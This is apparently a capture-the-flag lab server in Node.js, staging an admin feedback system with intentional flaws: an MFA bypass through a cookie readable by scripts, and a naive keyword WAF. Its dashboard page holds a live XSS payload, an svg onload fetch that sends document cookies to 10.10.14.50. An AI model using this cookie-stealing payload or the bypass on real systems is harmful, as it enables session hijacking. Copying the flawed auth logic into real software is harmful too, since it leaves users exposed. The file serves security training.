const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const PORT = 3075;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

// Global Middleware for Header
app.use((req, res, next) => {
    res.setHeader('X-Powered-By', 'SCENARIO75{Node.js}');
    next();
});

// PHASE 1: RECON
app.get('/', (req, res) => {
    res.cookie('pre_mfa_session', 'pending_mfa_verification', { httpOnly: false });
    res.send(`
        <!DOCTYPE html>
        <html><head><title>Admin Feedback System</title></head>
        <body>
            <h1>Admin Feedback System</h1>
            <p>System is currently undergoing MFA maintenance.</p>
        </body></html>
    `);
});

app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send(`User-agent: *\nDisallow: /api/verify-mfa # SCENARIO75{/api/verify-mfa}\nDisallow: /dashboard      # SCENARIO75{/dashboard}\n`);
});

// PHASE 2: DEFENSE EVASION (WAF & XSS)
app.post('/api/feedback', (req, res) => {
    const payload = req.body.payload || '';
    
    if (payload.toLowerCase().includes('<script>')) {
        return res.status(403).send(`[WAF ALERT] Malicious payload blocked! Flag: SCENARIO75{403} | SCENARIO75{POST}`);
    }
    if (payload.includes('document.cookie')) {
        return res.status(403).send(`[WAF ALERT] Direct cookie access denied. Flag: SCENARIO75{window['docu'+'ment']['coo'+'kie']}`);
    }
    if (payload.toLowerCase().includes('<svg') && payload.toLowerCase().includes('onload') && payload.includes('fetch')) {
        return res.send(`[SUCCESS] Feedback received and admin executed the payload! Flag: SCENARIO75{<svg>} | SCENARIO75{fetch} | SCENARIO75{False}`);
    }
    
    res.send('Feedback received safely.');
});

// PHASE 3: INITIAL ACCESS (MFA BYPASS)
app.get('/dashboard', (req, res) => {
    const cookies = req.cookies || {};
    let isAuthenticated = false;
    
    if (cookies.pre_mfa_session === 'pending_mfa_verification' || cookies.adm_sess) {
        isAuthenticated = true;
    }

    if (!isAuthenticated) {
        return res.status(401).send("401 Unauthorized - Please complete MFA first.");
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><title>Admin Dashboard</title></head>
        <body>
            <h1>Admin Dashboard [CONFIDENTIAL]</h1>
            <p>MFA Check Skipped -> SCENARIO75{/api/verify-mfa}</p>
            <p>Active Session Prefix -> SCENARIO75{adm_sess}</p>
            <div class="xss-payload">
                <p>Payload rendered here (SCENARIO75{xss-payload})</p>
                <svg onload="fetch('http://10.10.14.50/?c='+window['document']['cookie'])"></svg>
            </div>
            <div style="display:none;">SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}</div>
        </body>
        </html>
    `);
});

// START SERVER
app.listen(PORT, () => {
    console.log(`Lab server running on http://localhost:${PORT}`);
});
